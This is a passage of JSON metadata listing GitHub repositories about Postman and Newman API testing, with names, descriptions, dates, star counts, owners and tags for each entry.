me":"postman_test","full_name":"IulianaIagodka/postman_test","description":null,"fork":false,"created_at":"2020-01-21T13:08:38Z","updated_at":"2020-01-21T13:13:51Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":10695285,"owner_login":"IulianaIagodka","owner_avatar_url":"https://avatars3.githubusercontent.com/u/10695285?v=4","pulled":1,"tags":[]},{"id":143999986,"name":"postman-test","full_name":"Plinzen/postman-test","description":null,"fork":false,"created_at":"2018-08-08T10:47:49Z","updated_at":"2018-08-08T10:47:51Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":7579691,"owner_login":"Plinzen","owner_avatar_url":"https://avatars0.githubusercontent.com/u/7579691?v=4","pulled":1,"tags":[]},{"id":207124319,"name":"Postman-test","full_name":"FrauGerman/Postman-test","description":null,"fork":false,"created_at":"2019-09-08T14:26:36Z","updated_at":"2019-09-08T14:46:30Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":54103719,"owner_login":"FrauGerman","owner_avatar_url":"https://avatars1.githubusercontent.com/u/54103719?v=4","pulled":1,"tags":[]},{"id":158456480,"name":"postman-testing","full_name":"themightykai90/postman-testing","description":"Summary of Postman Pre-Req and Test Scripts useful in API testing","fork":false,"created_at":"2018-11-20T21:58:19Z","updated_at":"2018-11-20T21:58:20Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":44848310,"owner_login":"themightykai90","owner_avatar_url":"https://avatars0.githubusercontent.com/u/44848310?v=4","pulled":1,"tags":["test","testing","useful"]},{"id":176674207,"name":"postman-testing","full_name":"sangitar23/postman-testing","description":null,"fork":false,"created_at":"2019-03-20T07:01:51Z","updated_at":"2019-03-20T07:28:01Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":48080050,"owner_login":"sangitar23","owner_avatar_url":"https://avatars1.githubusercontent.com/u/48080050?v=4","pulled":1,"tags":[]},{"id":185907292,"name":"Teste-postman","full_name":"viniciuscsreistest/Teste-postman","description":null,"fork":false,"created_at":"2019-05-10T02:47:38Z","updated_at":"2019-05-10T02:47:38Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":47014979,"owner_login":"viniciuscsreistest","owner_avatar_url":"https://avatars3.githubusercontent.com/u/47014979?v=4","pulled":1,"tags":[]},{"id":197231356,"name":"postman-test","full_name":"aminamos/postman-test","description":null,"fork":false,"created_at":"2019-07-16T16:38:36Z","updated_at":"2019-07-16T16:38:36Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":26092352,"owner_login":"aminamos","owner_avatar_url":"https://avatars0.githubusercontent.com/u/26092352?v=4","pulled":1,"tags":[]},{"id":210040861,"name":"Postman-tests","full_name":"houndsofhell/Postman-tests","description":null,"fork":false,"created_at":"2019-09-21T19:16:47Z","updated_at":"2019-09-21T19:29:36Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":55135764,"owner_login":"houndsofhell","owner_avatar_url":"https://avatars2.githubusercontent.com/u/55135764?v=4","pulled":1,"tags":[]},{"id":172353263,"name":"Postman-tests","full_name":"SACDES7204/Postman-tests","description":null,"fork":false,"created_at":"2019-02-24T15:16:43Z","updated_at":"2019-11-14T16:47:57Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":42696484,"owner_login":"SACDES7204","owner_avatar_url":"https://avatars3.githubusercontent.com/u/42696484?v=4","pulled":1,"tags":[]},{"id":183589676,"name":"automation-travis","full_name":"martenvestman/automation-travis","description":"eStore with postman/newman tests","fork":false,"created_at":"2019-04-26T08:28:14Z","updated_at":"2019-04-28T20:43:44Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":35027097,"owner_login":"martenvestman","owner_avatar_url":"https://avatars1.githubusercontent.com/u/35027097?v=4","pulled":1,"tags":["test"," postman","tests","newman"]},{"id":65433440,"name":"postman-","full_name":"lt176762674/postman-","description":"根据json生成test脚本的小脚本","fork":false,"created_at":"2016-08-11T02:57:46Z","updated_at":"2016-08-11T02:57:46Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":10990495,"owner_login":"lt176762674","owner_avatar_url":"https://avatars1.githubusercontent.com/u/10990495?v=4","pulled":1,"tags":["test","json"]},{"id":117707341,"name":"Postman_TestScripts","full_name":"aynurf/Postman_TestScripts","description":null,"fork":false,"created_at":"2018-01-16T16:11:31Z","updated_at":"2018-01-16T16:11:31Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":4223378,"owner_login":"aynurf","owner_avatar_url":"https://avatars1.githubusercontent.com/u/4223378?v=4","pulled":1,"tags":[]},{"id":144122625,"name":"postman-reporter","full_name":"martinberlin/postman-reporter","description":"Make self-documented HTML pages from your Postman tests. Import test results in a Mysql Database","fork":false,"created_at":"2018-08-09T08:22:03Z","updated_at":"2019-12-05T09:02:42Z","stargazers_count":1,"watchers_count":1,"forks":1,"watchers":1,"score":1,"owner_id":2692928,"owner_login":"martinberlin","owner_avatar_url":"https://avatars2.githubusercontent.com/u/2692928?v=4","pulled":1,"tags":["test","tests","document","result","results","pages","documented"]},{"id":194766685,"name":"Postman-Tests","full_name":"Solijons/Postman-Tests","description":"Here is sample of writing tests in post using javascript syntax","fork":false,"created_at":"2019-07-02T01:32:12Z","updated_at":"2019-07-02T01:32:12Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":40540002,"owner_login":"Solijons","owner_avatar_url":"https://avatars3.githubusercontent.com/u/40540002?v=4","pulled":1,"tags":["test","tests","script","tests ","sample","java","javascript","writing","syntax"]},{"id":195050318,"name":"test-postman","full_name":"lexym/test-postman","description":null,"fork":false,"created_at":"2019-07-03T12:36:14Z","updated_at":"2019-10-08T10:16:44Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":28095971,"owner_login":"lexym","owner_avatar_url":"https://avatars2.githubusercontent.com/u/28095971?v=4","pulled":1,"tags":[]},{"id":217150361,"name":"postman-test","full_name":"mmarinez/postman-test","description":null,"fork":false,"created_at":"2019-10-23T20:45:39Z","updated_at":"2019-10-23T20:55:35Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":18508975,"owner_login":"mmarinez","owner_avatar_url":"https://avatars0.githubusercontent.com/u/18508975?v=4","pulled":1,"tags":[]},{"id":211599256,"name":"Postman_Test","full_name":"Linmuer1/Postman_Test","description":null,"fork":false,"created_at":"2019-09-29T03:44:16Z","updated_at":"2019-09-29T08:57:56Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":36976170,"owner_login":"Linmuer1","owner_avatar_url":"https://avatars3.githubusercontent.com/u/36976170?v=4","pulled":1,"tags":[]},{"id":233451771,"name":"postman-tests","full_name":"vojtechrojicek/postman-tests","description":null,"fork":false,"created_at":"2020-01-12T20:10:10Z","updated_at":"2020-01-17T08:43:59Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":42407746,"owner_login":"vojtechrojicek","owner_avatar_url":"https://avatars1.githubusercontent.com/u/42407746?v=4","pulled":1,"tags":[]},{"id":105537991,"name":"datafordeler-postman","full_name":"magenta-aps/datafordeler-postman","description":"Postman test-suite af datafordeler funktionalitet.","fork":false,"created_at":"2017-10-02T13:34:26Z","updated_at":"2017-10-06T12:08:30Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":996271,"owner_login":"magenta-aps","owner_avatar_url":"https://avatars0.githubusercontent.com/u/996271?v=4","pulled":1,"tags":["test","data","suite"]},{"id":73389903,"name":"TestRepo","full_name":"CDonoghue94/TestRepo","description":"This is a test repo for postman","fork":false,"created_at":"2016-11-10T14:32:32Z","updated_at":"2016-11-10T14:32:32Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":23311644,"owner_login":"CDonoghue94","owner_avatar_url":"https://avatars0.githubusercontent.com/u/23311644?v=4","pulled":1,"tags":["test"," postman","repo"]},{"id":138382008,"name":"postman_asana","full_name":"harshendrathakur/postman_asana","description":"this contains postman tests for asana.com","fork":false,"created_at":"2018-06-23T07:47:34Z","updated_at":"2018-06-23T08:56:00Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":40120518,"owner_login":"harshendrathakur","owner_avatar_url":"https://avatars0.githubusercontent.com/u/40120518?v=4","pulled":1,"tags":["test"," postman","tests","tests ","contain","postman tests"]},{"id":143004702,"name":"postman-newman-jenkins","full_name":"snspinn/postman-newman-jenkins","description":"some test repository","fork":false,"created_at":"2018-07-31T11:23:14Z","updated_at":"2018-08-23T15:24:17Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":41950061,"owner_login":"snspinn","owner_avatar_url":"https://avatars3.githubusercontent.com/u/41950061?v=4","pulled":1,"tags":["test","repo","repos","repository"]},{"id":103730252,"name":"postman-integration-test","full_name":"IOTechSystems/postman-integration-test","description":"run integration test","fork":false,"created_at":"2017-09-16T06:21:06Z","updated_at":"2019-04-09T12:22:49Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":31407855,"owner_login":"IOTechSystems","owner_avatar_url":"https://avatars3.githubusercontent.com/u/31407855?v=4","pulled":1,"tags":["test","integration"]},{"id":187878348,"name":"Postman_Newman","full_name":"YuriyPent/Postman_Newman","description":"Install, run, pre-request script, test","fork":false,"created_at":"2019-05-21T16:47:41Z","updated_at":"2019-06-24T08:14:42Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":12219558,"owner_login":"YuriyPent","owner_avatar_url":"https://avatars2.githubusercontent.com/u/12219558?v=4","pulled":1,"tags":["test","request","script"]},{"id":77899241,"name":"AndroidPostman","full_name":"HwangJaeYoung/AndroidPostman","description":"AndroidPostman for testing the oneM2M Server","fork":false,"created_at":"2017-01-03T08:43:12Z","updated_at":"2017-09-20T16:17:06Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":7313213,"owner_login":"HwangJaeYoung","owner_avatar_url":"https://avatars3.githubusercontent.com/u/7313213?v=4","pulled":1,"tags":["test","testing"]},{"id":225478887,"name":"test","full_name":"itsatya/test","description":"This is a test repository created by Postman","fork":false,"created_at":"2019-12-02T22:13:05Z","updated_at":"2019-12-02T22:32:32Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":11086631,"owner_login":"itsatya","owner_avatar_url":"https://avatars0.githubusercontent.com/u/11086631?v=4","pulled":1,"tags":["test","create","repo","repos","repository"]},{"id":206581953,"name":"Test","full_name":"patricklwanga/Test","description":"This is a test repository created by Postman","fork":false,"created_at":"2019-09-05T14:19:36Z","updated_at":"2019-09-05T14:19:36Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":36103753,"owner_login":"patricklwanga","owner_avatar_url":"https://avatars3.githubusercontent.com/u/36103753?v=4","pulled":1,"tags":["test","create","repo","repos","repository"]},{"id":242243711,"name":"Hello-Postman","full_name":"PaulinaCoding/Hello-Postman","description":"This is your Postman test repository","fork":false,"created_at":"2020-02-21T22:45:23Z","updated_at":"2020-02-21T22:45:23Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":37420244,"owner_login":"PaulinaCoding","owner_avatar_url":"https://avatars0.githubusercontent.com/u/37420244?v=4","pulled":1,"tags":["test","repo","repos","repository"]},{"id":248766538,"name":"PostManTest","full_name":"UcheEmeka/PostManTest","description":"Repo to test Post Man","fork":false,"created_at":"2020-03-20T13:48:00Z","updated_at":"2020-03-20T13:50:06Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":59360596,"owner_login":"UcheEmeka","owner_avatar_url":"https://avatars3.githubusercontent.com/u/59360596?v=4","pulled":1,"tags":["test"]},{"id":239327676,"name":"postman-yaddress","full_name":"bamanczak/postman-yaddress","description":"Proof of Concept for running postman tests using TravisCI","fork":false,"created_at":"2020-02-09T15:33:33Z","updated_at":"2020-02-09T19:27:20Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":8224947,"owner_login":"bamanczak","owner_avatar_url":"https://avatars2.githubusercontent.com/u/8224947?v=4","pulled":1,"tags":["test"," postman","tests","tests ","running","postman tests"]},{"id":234682406,"name":"Postman-course","full_name":"alesneva/Postman-course","description":"This is a test repository created by Postman","fork":false,"created_at":"2020-01-18T04:42:23Z","updated_at":"2020-01-18T04:42:23Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":28774032,"owner_login":"alesneva","owner_avatar_url":"https://avatars2.githubusercontent.com/u/28774032?v=4","pulled":1,"tags":["test","create","repo","repos","repository"]},{"id":162435319,"name":"Postman-task","full_name":"samovolkinmaxim/Postman-task","description":"This is a test repo for Postman task","fork":false,"created_at":"2018-12-19T12:37:16Z","updated_at":"2018-12-19T12:57:49Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":40469143,"owner_login":"samovolkinmaxim","owner_avatar_url":"https://avatars2.githubusercontent.com/u/40469143?v=4","pulled":1,"tags":["test","repo","task"]},{"id":215278682,"name":"postman-dummy-test","full_name":"niroshan009/postman-dummy-test","description":null,"fork":false,"created_at":"2019-10-15T11:12:01Z","updated_at":"2019-10-16T06:32:04Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":55729320,"owner_login":"niroshan009","owner_avatar_url":"https://avatars0.githubusercontent.com/u/55729320?v=4","pulled":1,"tags":[]},{"id":64261585,"name":"WestFieldPostmanTests","full_name":"EDLyonhart/WestFieldPostmanTests","description":"Automated Acceptance // Integration tests to be run against Westfield's APIs","fork":false,"created_at":"2016-07-26T23:30:51Z","updated_at":"2016-07-26T23:30:51Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":8573666,"owner_login":"EDLyonhart","owner_avatar_url":"https://avatars3.githubusercontent.com/u/8573666?v=4","pulled":1,"tags":["test","tests","tests "]},{"id":143761244,"name":"postman-tutorial","full_name":"HoldenRiot/postman-tutorial","description":"A very basic Postman tutorial for testing purposes.","fork":false,"created_at":"2018-08-06T17:29:37Z","updated_at":"2018-08-09T13:45:24Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":31134130,"owner_login":"HoldenRiot","owner_avatar_url":"https://avatars3.githubusercontent.com/u/31134130?v=4","pulled":1,"tags":["test","testing","very","tutorial","purposes"]},{"id":213428538,"name":"Regression-Testing-Postman","full_name":"MasonChambers/Regression-Testing-Postman","description":"regression testing for postman with newman and formatted html output","fork":false,"created_at":"2019-10-07T16:08:18Z","updated_at":"2019-10-07T16:08:18Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":46990548,"owner_login":"MasonChambers","owner_avatar_url":"https://avatars1.githubusercontent.com/u/46990548?v=4","pulled":1,"tags":["test"," postman","testing","form","newman","format","html","output","regression","formatted"]},{"id":85604782,"name":"zTestPostman2","full_name":"brankocelic/zTestPostman2","description":null,"fork":false,"created_at":"2017-03-20T17:14:14Z","updated_at":"2018-04-16T14:58:49Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":26170537,"owner_login":"brankocelic","owner_avatar_url":"https://avatars2.githubusercontent.com/u/26170537?v=4","pulled":1,"tags":[]},{"id":88755457,"name":"Test-from-postman","full_name":"joshuaeobrian/Test-from-postman","description":null,"fork":false,"created_at":"2017-04-19T14:36:34Z","updated_at":"2017-04-19T14:36:34Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":23066776,"owner_login":"joshuaeobrian","owner_avatar_url":"https://avatars1.githubusercontent.com/u/23066776?v=4","pulled":1,"tags":[]},{"id":149257864,"name":"httpbin-postman-tests","full_name":"doubleedged2005/httpbin-postman-tests","description":null,"fork":false,"created_at":"2018-09-18T08:55:07Z","updated_at":"2018-09-18T08:56:30Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":42819984,"owner_login":"doubleedged2005","owner_avatar_url":"https://avatars0.githubusercontent.com/u/42819984?v=4","pulled":1,"tags":[]},{"id":228446057,"name":"postman-backend-testing","full_name":"bestchanges/postman-backend-testing","description":"Example of how to implement HTTP API automation testing using Postman and Newman","fork":false,"created_at":"2019-12-16T18:07:00Z","updated_at":"2019-12-17T14:00:55Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":9627923,"owner_login":"bestchanges","owner_avatar_url":"https://avatars2.githubusercontent.com/u/9627923?v=4","pulled":1,"tags":["test","testing","auto","automat","implement","automation"]},{"id":126987440,"name":"Test-Project-from-Postman","full_name":"bishbash/Test-Project-from-Postman","description":"A test project created by the forgerock.org market place","fork":false,"created_at":"2018-03-27T13:04:46Z","updated_at":"2018-03-27T13:04:46Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":28436957,"owner_login":"bishbash","owner_avatar_url":"https://avatars2.githubusercontent.com/u/28436957?v=4","pulled":1,"tags":["test","create","place","forge"]},{"id":123311398,"name":"checks-postman-tests","full_name":"LogarAvrelian/checks-postman-tests","description":null,"fork":false,"created_at":"2018-02-28T16:26:54Z","updated_at":"2018-02-28T16:26:54Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":36846504,"owner_login":"LogarAvrelian","owner_avatar_url":"https://avatars3.githubusercontent.com/u/36846504?v=4","pulled":1,"tags":[]},{"id":165069945,"name":"SimpleTestPostman","full_name":"hieiiganashi/SimpleTestPostman","description":null,"fork":false,"created_at":"2019-01-10T14:02:43Z","updated_at":"2019-04-08T17:06:42Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":18649616,"owner_login":"hieiiganashi","owner_avatar_url":"https://avatars1.githubusercontent.com/u/18649616?v=4","pulled":1,"tags":[]},{"id":173049551,"name":"test_jenkins_postman_build","full_name":"msravi16/test_jenkins_postman_build","description":null,"fork":false,"created_at":"2019-02-28T05:51:55Z","updated_at":"2019-02-28T09:31:43Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":16087458,"owner_login":"msravi16","owner_avatar_url":"https://avatars0.githubusercontent.com/u/16087458?v=4","pulled":1,"tags":[]},{"id":238690643,"name":"project-test-postman","full_name":"leosiimas/project-test-postman","description":null,"fork":false,"created_at":"2020-02-06T13:04:54Z","updated_at":"2020-02-06T13:04:54Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":46271725,"owner_login":"leosiimas","owner_avatar_url":"https://avatars3.githubusercontent.com/u/46271725?v=4","pulled":1,"tags":[]},{"id":217800881,"name":"testes-automatizados-postman","full_name":"treslebr/testes-automatizados-postman","description":"Projeto no Postman para a realização de testes automatizados. ","fork":false,"created_at":"2019-10-27T03:37:36Z","updated_at":"2019-11-03T22:56:57Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":49782587,"owner_login":"treslebr","owner_avatar_url":"https://avatars0.githubusercontent.com/u/49782587?v=4","pulled":1,"tags":["test","auto","automat","testes","realiza","automatizado","automatizados"]},{"id":91855340,"name":"testes-postman-backend","full_name":"nildowjunior-projetos/testes-postman-backend","description":null,"fork":false,"created_at":"2017-05-20T00:39:28Z","updated_at":"2017-05-20T00:39:28Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":19480988,"owner_login":"nildowjunior-projetos","owner_avatar_url":"https://avatars3.githubusercontent.com/u/19480988?v=4","pulled":1,"tags":[]},{"id":169629898,"name":"PostManTest","full_name":"Fearonz/PostManTest","description":null,"fork":false,"created_at":"2019-02-07T19:32:32Z","updated_at":"2019-02-07T19:32:35Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":25453268,"owner_login":"Fearonz","owner_avatar_url":"https://avatars2.githubusercontent.com/u/25453268?v=4","pulled":1,"tags":[]},{"id":170326381,"name":"PostManTest","full_name":"S00083446/PostManTest","description":null,"fork":false,"created_at":"2019-02-12T13:51:46Z","updated_at":"2019-02-12T13:51:46Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":25453228,"owner_login":"S00083446","owner_avatar_url":"https://avatars0.githubusercontent.com/u/25453228?v=4","pulled":1,"tags":[]},{"id":226247375,"name":"Postman_and_Newman_Testing","full_name":"msayin/Postman_and_Newman_Testing","description":null,"fork":false,"created_at":"2019-12-06T04:44:36Z","updated_at":"2019-12-06T04:44:36Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":57653430,"owner_login":"msayin","owner_avatar_url":"https://avatars1.githubusercontent.com/u/57653430?v=4","pulled":1,"tags":[]},{"id":209249206,"name":"postman-test-practice","full_name":"prashant18197/postman-test-practice","description":null,"fork":false,"created_at":"2019-09-18T07:45:48Z","updated_at":"2019-09-18T08:05:47Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":55481474,"owner_login":"prashant18197","owner_avatar_url":"https://avatars1.githubusercontent.com/u/55481474?v=4","pulled":1,"tags":[]},{"id":90822415,"name":"postman-newman-test","full_name":"vdespa/postman-newman-test","description":null,"fork":false,"created_at":"2017-05-10T04:56:00Z","updated_at":"2019-05-09T19:36:12Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":1197635,"owner_login":"vdespa","owner_avatar_url":"https://avatars3.githubusercontent.com/u/1197635?v=4","pulled":1,"tags":[]},{"id":148581669,"name":"httpbin-postman-test","full_name":"taysan003/httpbin-postman-test","description":null,"fork":false,"created_at":"2018-09-13T04:25:21Z","updated_at":"2018-09-13T04:33:05Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":12110742,"owner_login":"taysan003","owner_avatar_url":"https://avatars3.githubusercontent.com/u/12110742?v=4","pulled":1,"tags":[]},{"id":221273418,"name":"Test-repository-By-Postman","full_name":"phrobinet/Test-repository-By-Postman","description":"This is a test repository created by Postman","fork":false,"created_at":"2019-11-12T17:25:08Z","updated_at":"2019-11-12T17:25:08Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":38053370,"owner_login":"phrobinet","owner_avatar_url":"https://avatars0.githubusercontent.com/u/38053370?v=4","pulled":1,"tags":["test","create","repo","repos","repository"]},{"id":236598778,"name":"Postman-Tests-Monetha","full_name":"zivile-b/Postman-Tests-Monetha","description":null,"fork":false,"created_at":"2020-01-27T21:26:37Z","updated_at":"2020-01-27T21:42:42Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":45869851,"owner_login":"zivile-b","owner_avatar_url":"https://avatars0.githubusercontent.com/u/45869851?v=4","pulled":1,"tags":[]},{"id":214897212,"name":"Test-repository-Postman","full_name":"vicontesse/Test-repository-Postman","description":"This is a test repository created by Postman","fork":false,"created_at":"2019-10-13T21:33:28Z","updated_at":"2019-10-13T21:33:28Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":54743236,"owner_login":"vicontesse","owner_avatar_url":"https://avatars3.githubusercontent.com/u/54743236?v=4","pulled":1,"tags":["test","create","repo","repos","repository"]},{"id":232444301,"name":"test-postman-action","full_name":"jarrodparkes/test-postman-action","description":null,"fork":false,"created_at":"2020-01-08T00:34:38Z","updated_at":"2020-01-08T01:14:06Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":1331063,"owner_login":"jarrodparkes","owner_avatar_url":"https://avatars2.githubusercontent.com/u/1331063?v=4","pulled":1,"tags":[]},{"id":144600969,"name":"devops-postman-tests","full_name":"jscrobinson/devops-postman-tests","description":"Run postman tests from JSON file","fork":false,"created_at":"2018-08-13T15:47:20Z","updated_at":"2018-08-14T12:00:16Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":235064,"owner_login":"jscrobinson","owner_avatar_url":"https://avatars2.githubusercontent.com/u/235064?v=4","pulled":1,"tags":["test"," postman","file","tests","tests ","postman tests"]},{"id":238608833,"name":"test-postman-jenkin","full_name":"infinetys/test-postman-jenkin","description":null,"fork":false,"created_at":"2020-02-06T04:39:53Z","updated_at":"2020-02-06T04:48:22Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":22219829,"owner_login":"infinetys","owner_avatar_url":"https://avatars2.githubusercontent.com/u/22219829?v=4","pulled":1,"tags":[]},{"id":220351385,"name":"Postman-Backup-Tests","full_name":"SteveStatia/Postman-Backup-Tests","description":null,"fork":false,"created_at":"2019-11-08T00:01:05Z","updated_at":"2019-11-08T00:04:19Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":26208352,"owner_login":"SteveStatia","owner_avatar_url":"https://avatars2.githubusercontent.com/u/26208352?v=4","pulled":1,"tags":[]},{"id":194676550,"name":"Test-With-Postman","full_name":"rcquintana90/Test-With-Postman","description":"Automated tests using Postman to Predictor PHP 7","fork":false,"created_at":"2019-07-01T13:19:17Z","updated_at":"2019-07-01T13:20:04Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":51922925,"owner_login":"rcquintana90","owner_avatar_url":"https://avatars1.githubusercontent.com/u/51922925?v=4","pulled":1,"tags":["test","tests","tests "]},{"id":226923359,"name":"Final-Test-Postman","full_name":"Vukasin6664/Final-Test-Postman","description":null,"fork":false,"created_at":"2019-12-09T17:01:12Z","updated_at":"2019-12-09T17:12:46Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":57724097,"owner_login":"Vukasin6664","owner_avatar_url":"https://avatars2.githubusercontent.com/u/57724097?v=4","pulled":1,"tags":[]},{"id":237000104,"name":"test_env_postman","full_name":"7odri9o/test_env_postman","description":null,"fork":false,"created_at":"2020-01-29T14:23:27Z","updated_at":"2020-01-29T14:41:21Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":7338419,"owner_login":"7odri9o","owner_avatar_url":"https://avatars0.githubusercontent.com/u/7338419?v=4","pulled":1,"tags":[]},{"id":122568803,"name":"postman-newman-jenkins","full_name":"rodionovmax/postman-newman-jenkins","description":"project for testing API in postman","fork":false,"created_at":"2018-02-23T03:29:43Z","updated_at":"2018-02-23T03:29:43Z","stargazers_count":0,"watchers_count":0,"forks":1,"watchers":0,"score":1,"owner_id":36495062,"owner_login":"rodionovmax","owner_avatar_url":"https://avatars3.githubusercontent.com/u/36495062?v=4","pulled":1,"tags":["test"," postman","testing"]},{"id":219203184,"name":"Test-repository","full_name":"GoldenBootz/Test-repository","description":"this is a test created by postman","fork":false,"created_at":"2019-11-02T19:26:11Z","updated_at":"2019-11-02T19:26:11Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":2918469,"owner_login":"GoldenBootz","owner_avatar_url":"https://avatars1.githubusercontent.com/u/2918469?v=4","pulled":1,"tags":["test"," postman","create"]},{"id":42392151,"name":"Postman-Newman-testing","full_name":"felnne/Postman-Newman-testing","description":"Simple project to use Postman's Newman tool to test the BAS People API.","fork":false,"created_at":"2015-09-13T10:39:09Z","updated_at":"2018-09-30T08:49:29Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":7847612,"owner_login":"felnne","owner_avatar_url":"https://avatars2.githubusercontent.com/u/7847612?v=4","pulled":1,"tags":["test","tool"]},{"id":143397296,"name":"httpbin-postman-tests","full_name":"sergeychubuk/httpbin-postman-tests","description":null,"fork":false,"created_at":"2018-08-03T08:01:29Z","updated_at":"2018-08-03T08:01:29Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":40801967,"owner_login":"sergeychubuk","owner_avatar_url":"https://avatars3.githubusercontent.com/u/40801967?v=4","pulled":1,"tags":[]},{"id":181410255,"name":"MyPostmanTest","full_name":"williamma321/MyPostmanTest","description":null,"fork":false,"created_at":"2019-04-15T04:08:47Z","updated_at":"2019-06-28T15:19:51Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":48567133,"owner_login":"williamma321","owner_avatar_url":"https://avatars3.githubusercontent.com/u/48567133?v=4","pulled":1,"tags":[]},{"id":214901678,"name":"Test-repository-Postman-Twillio","full_name":"vicontesse/Test-repository-Postman-Twillio","description":"This is a test repository created by Postman","fork":false,"created_at":"2019-10-13T22:12:55Z","updated_at":"2019-10-13T22:12:55Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":54743236,"owner_login":"vicontesse","owner_avatar_url":"https://avatars3.githubusercontent.com/u/54743236?v=4","pulled":1,"tags":["test","create","repo","repos","repository"]},{"id":211079105,"name":"postman-test-scripts-poc","full_name":"cboiam/postman-test-scripts-poc","description":"Poc of the automated pre request scripts and test scripts in postman","fork":false,"created_at":"2019-09-26T12:03:47Z","updated_at":"2019-11-14T17:03:11Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":38038695,"owner_login":"cboiam","owner_avatar_url":"https://avatars3.githubusercontent.com/u/38038695?v=4","pulled":1,"tags":["test"," postman","request","script","auto","automat","scripts","automate","automated","pre 